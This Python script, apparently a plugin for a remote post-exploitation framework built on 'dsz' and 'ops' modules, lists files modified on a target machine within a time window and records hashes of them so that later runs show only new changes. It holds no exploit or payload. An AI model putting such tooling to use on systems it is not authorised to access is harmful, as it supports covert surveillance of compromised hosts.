
import ops, ops.cmd, dsz, dsz.cmd, dsz.ui, ops.pprint, ops.system.clocks
from datetime import timedelta
import time
from optparse import OptionParser
import hashlib, os.path, binascii, datetime, sys, re
import ops.timehelper
from ops.parseargs import ArgumentParser
filters = ['.', '..']

def _checkage(age):
    for char in age:
        if (not (char in ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'y', 'w', 'd', 'h', 'm', 's'])):
            return False
    return True

def _getsafeword(agearg):
    targetgmt = ops.system.clocks.gmtime()
    ageseconds = ops.timehelper.get_seconds_from_age(agearg)
    afterdatetime = (targetgmt - timedelta(seconds=ageseconds))
    beforedatetime = (targetgmt + timedelta(seconds=0))
    return (afterdatetime.strftime('%Y-%m-%d %H:%M:%S'), beforedatetime.strftime('%Y-%m-%d %H:%M:%S'))

def _getrangeword(agearg, datestring):
    fromdatetime = datetime.datetime(*time.strptime(datestring, '%Y-%m-%d %H:%M:%S')[0:6])
    ageseconds = ops.timehelper.get_seconds_from_age(agearg)
    afterdatetime = (fromdatetime - timedelta(seconds=ageseconds))
    beforedatetime = (fromdatetime + timedelta(seconds=0))
    return (afterdatetime.strftime('%Y-%m-%d %H:%M:%S'), beforedatetime.strftime('%Y-%m-%d %H:%M:%S'))

def _getcenteredword(agearg, datestring):
    fromdatetime = datetime.datetime(*time.strptime(datestring, '%Y-%m-%d %H:%M:%S')[0:6])
    ageseconds = ops.timehelper.get_seconds_from_age(agearg)
    beforedatetime = (fromdatetime + timedelta(seconds=ageseconds))
    return beforedatetime.strftime('%Y-%m-%d %H:%M:%S')

def _filterfilesbyname(dirres):
    retval = []
    for moddir in dirres.diritem:
        retval.extend(filter((lambda x: (x.name not in filters)), moddir.fileitem))
    return retval

def _statehash(fileitem):
    myhash = hashlib.md5()
    myhash.update(ops.utf8(('%s%s%s' % (fileitem.filetimes.modified.time, fileitem.dszparent.path, fileitem.name))))
    return binascii.hexlify(myhash.digest())

def _dohour(mask='*', path='*', age='1h', recursive=True, safe=False, nodiff=False, noquiet=False, fromtime=None):
    dircmd = ops.cmd.getDszCommand('dir', mask=mask, path=path, recursive=recursive)
    if ((not safe) and (fromtime is None)):
        dircmd.age = ops.timehelper.get_age_from_seconds(ops.timehelper.get_seconds_from_age(age.lower()))
    elif safe:
        (dircmd.after, dircmd.before) = _getsafeword(age.lower())
    elif (fromtime is not None):
        (dircmd.after, dircmd.before) = _getrangeword(age.lower(), fromtime)
    dircmd.norecord = nodiff
    dircmd.dszquiet = (not noquiet)
    ops.info(('Running %s' % dircmd))
    dirobj = dircmd.execute()
    if (not dircmd.success):
        ops.error('=== Dir failed with following errors ===')
        for error in dirobj.commandmetadata.friendlyerrors[(-1)]:
            ops.error(error)
        return False
    if (not nodiff):
        return dirobj
    else:
        return True

def _recordstate(dirres, filename, restart=False, hashfunc=_statehash):
    if (os.path.exists(filename) and (not restart)):
        filemode = 'a'
        adds = _dodiff(dirres, filename)
    else:
        filemode = 'w'
        adds = _filterfilesbyname(dirres)
    try:
        recordfile = open(filename, filemode)
        for modfile in adds:
            recordfile.write(('%s\n' % hashfunc(modfile)))
    except:
        pass
    finally:
        recordfile.close()

def _dodiff(dirres, filename, hashfunc=_statehash):
    previous = []
    retval = []
    recordfile = open(filename, 'r')
    try:
        for line in recordfile:
            previous.append(line[:(-1)])
    except:
        ops.error('Could not open previous results')
        raise Exception('Could not open previous dir results for comparison')
    finally:
        recordfile.close()
    for modfile in _filterfilesbyname(dirres):
        if (hashfunc(modfile) not in previous):
            retval.append(modfile)
    return retval

def main(mask='*', path='*', age='1h', recursive=True, restart=False, safe=False, noquiet=False, fromtime=None):
    if (not os.path.exists(os.path.join(ops.TARGET_TEMP, 'hour.txt'))):
        output = ('Recording initial data, running "dir -mask %s -path %s -age %s' % (mask, path, age))
        if recursive:
            output += ' -recursive'
        output += '"'
        ops.info(output)
        dirres = _dohour(mask=mask, path=path, age=age, recursive=recursive, safe=safe, noquiet=noquiet, fromtime=fromtime)
        if (dirres is False):
            return False
        diffs = _filterfilesbyname(dirres)
        _recordstate(dirres, os.path.join(os.path.join(ops.TARGET_TEMP, 'hour.txt')), restart)
    else:
        ops.info(('Running differential check going back %s' % age))
        dirres = _dohour(mask=mask, path=path, age=age, recursive=recursive, safe=safe, noquiet=noquiet, fromtime=fromtime)
        if (dirres is False):
            return False
        diffs = _dodiff(dirres, os.path.join(os.path.join(ops.TARGET_TEMP, 'hour.txt')))
        _recordstate(dirres, os.path.join(os.path.join(ops.TARGET_TEMP, 'hour.txt')), restart)
    diffnames = []
    for modfile in diffs:
        prettyfiletime = modfile.filetimes.modified.time[0:19].replace('T', ' ')
        if modfile.attributes.directory:
            diffnames.append({'Path': modfile.dszparent.path, 'Name': modfile.name, 'Size': '<DIR>', 'Modtime': prettyfiletime})
        else:
            diffnames.append({'Path': modfile.dszparent.path, 'Name': modfile.name, 'Size': modfile.size, 'Modtime': prettyfiletime})
    if (len(diffnames) > 0):
        ops.pprint.pprint(diffnames, header=['Modtime', 'Size', 'Path', 'Name'], dictorder=['Modtime', 'Size', 'Path', 'Name'])
    else:
        ops.info('No changes detected')
if (__name__ == '__main__'):
    parser = ArgumentParser()
    path_group = parser.add_mutually_exclusive_group()
    time_group = parser.add_mutually_exclusive_group()
    age_group = parser.add_mutually_exclusive_group()
    parser.add_argument('--mask', action='store', dest='mask', default='*', help='Mask to use for the dir command, default is *')
    path_group.add_argument('--path', action='store', dest='path', default='*', help='Path to use for the dir command, default is *')
    age_group.add_argument('--age', action='store', dest='age', default='1h', help='Path to use for the dir command, default is 1h, may be ([#y][#w][#d][#h][#m][#s])')
    parser.add_argument('--recursive', action='store_true', dest='recursive', default=False, help='If present, dir will be done recursively, otherwise will not be recursive')
    parser.add_argument('--restart', action='store_true', dest='restart', default=False, help='If present, will not compare with previous results and will start a new baseline')
    parser.add_argument('--safe', action='store_true', dest='safe', default=False, help="Will run times and then craft a before/after parameter, rather then use dir's age parameter")
    path_group.add_argument('--sysdrive', action='store_true', dest='sysdrive', default=False, help='Will only run the dir against the system drive')
    parser.add_argument('--nodiff', action='store_true', dest='nodiff', default=False, help='Do not run a diffhour, only a normal hour')
    parser.add_argument('--noquiet', action='store_true', dest='noquiet', default=False, help='Display the results of the dir to screen')
    time_group.add_argument('--fromtime', action='store', dest='fromtime', metavar='"YYYY-MM-DD [hh:mm:ss]"', default=None, help='Date from which to calculate the age. Default is to calculate normally.')
    time_group.add_argument('--centeredtime', action='store', dest='centeredtime', metavar='"YYYY-MM-DD [hh:mm:ss]"', default=None, help='Date from which to calculate the age in both directions. Default is to calculate normally.')
    age_group.add_argument('--fromstart', action='store_true', dest='fromstart', default=False, help="Calculate the -after time since the first 'time' command run on this cpaddr")
    options = parser.parse_args()
    mask = ('"%s"' % options.mask)
    path = ('"%s"' % options.path.rstrip('\\'))
    age = options.age
    if (not _checkage(options.age)):
        dsz.ui.Echo('Invalid age', dsz.ERROR)
        parser.print_help()
        sys.exit(1)
    fromtime = None
    if (options.fromstart and ((options.fromtime is not None) or (options.centeredtime is not None))):
        dsz.ui.Echo('You cannot use -fromstart with -fromtime or -centeredtime', dsz.ERROR)
        parser.print_help()
        sys.exit(1)
    if (options.fromtime is not None):
        date_re = '((1[0-9]|2[0-9])\\d\\d)-(0[1-9]|1[0-2])-([0-2][0-9]|3[0-2])'
        time_re = '(2[0-3]|[0-1][0-9]):([0-5][0-9]):([0-5][0-9])'
        if (re.match(('^%s$' % date_re), options.fromtime.strip('"')) is not None):
            fromtime = ('%s 00:00:00' % options.fromtime.strip('"'))
        elif (re.match(('^%s %s$' % (date_re, time_re)), options.fromtime.strip('"')) is not None):
            fromtime = options.fromtime.strip('"')
        else:
            dsz.ui.Echo('Invalid fromtime', dsz.ERROR)
            parser.print_help()
            sys.exit(1)
    elif (options.centeredtime is not None):
        date_re = '((1[0-9]|2[0-9])\\d\\d)-(0[1-9]|1[0-2])-([0-2][0-9]|3[0-2])'
        time_re = '(2[0-3]|[0-1][0-9]):([0-5][0-9]):([0-5][0-9])'
        if (re.match(('^%s$' % date_re), options.centeredtime.strip('"')) is not None):
            fromtime = _getcenteredword(options.age, ('%s 00:00:00' % options.centeredtime.strip('"')))
            age = ops.timehelper.get_age_from_seconds((ops.timehelper.get_seconds_from_age(options.age) * 2))
        elif (re.match(('^%s %s$' % (date_re, time_re)), options.centeredtime.strip('"')) is not None):
            fromtime = _getcenteredword(options.age, options.centeredtime.strip('"'))
            age = ops.timehelper.get_age_from_seconds((ops.timehelper.get_seconds_from_age(options.age) * 2))
        else:
            dsz.ui.Echo('Invalid centeredtime', dsz.ERROR)
            parser.print_help()
            sys.exit(1)
    elif options.fromstart:
        starttime = ops.timehelper.get_first_gmttime_from_remote()
        currenttime = ops.system.clocks.gmtime()
        timediff = (currenttime - starttime)
        totalseconds = (int(timediff.total_seconds()) + 1)
        age = ops.timehelper.get_age_from_seconds(totalseconds)
    if options.sysdrive:
        (path, garbage) = os.path.splitdrive(dsz.path.windows.GetSystemPath())
    try:
        if options.nodiff:
            _dohour(mask, path, age, options.recursive, options.safe, options.nodiff, options.noquiet, fromtime)
        else:
            main(mask, path, age, options.recursive, options.restart, options.safe, options.noquiet, fromtime)
    except RuntimeError as e:
        dsz.ui.Echo(('\nCaught RuntimeError: %s' % e), dsz.ERROR)